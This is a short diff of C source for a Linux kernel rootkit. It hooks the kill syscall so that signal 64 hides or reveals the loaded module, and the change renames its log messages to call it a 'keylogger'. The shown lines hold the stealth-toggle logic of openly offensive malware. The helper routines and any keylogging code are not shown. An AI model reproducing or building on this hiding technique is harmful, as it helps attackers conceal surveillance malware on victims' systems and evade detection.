@@ -285,13 +285,13 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 
     if ( (sig == 64) && (hidden == 0) )
     {
-        printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
+        printk(KERN_INFO "rootkit: hiding keylogger kernel module...\n");
         hideme();
         hidden = 1;
     }
     else if ( (sig == 64) && (hidden == 1) )
     {
-        printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
+        printk(KERN_INFO "rootkit: revealing keylogger kernel module...\n");
         showme();
         hidden = 0;
     }
@@ -312,13 +312,13 @@ static asmlinkage int hook_kill(pid_t pid, int sig)
 
     if ( (sig == 64) && (hidden == 0) )
     {
-        printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
+        printk(KERN_INFO "rootkit: hiding keylogger kernel module...\n");
         hideme();
         hidden = 1;
     }
     else if ( (sig == 64) && (hidden == 1) )
     {
-        printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
+        printk(KERN_INFO "rootkit: revealing keylogger kernel module...\n");
         showme();
         hidden = 0;
     }
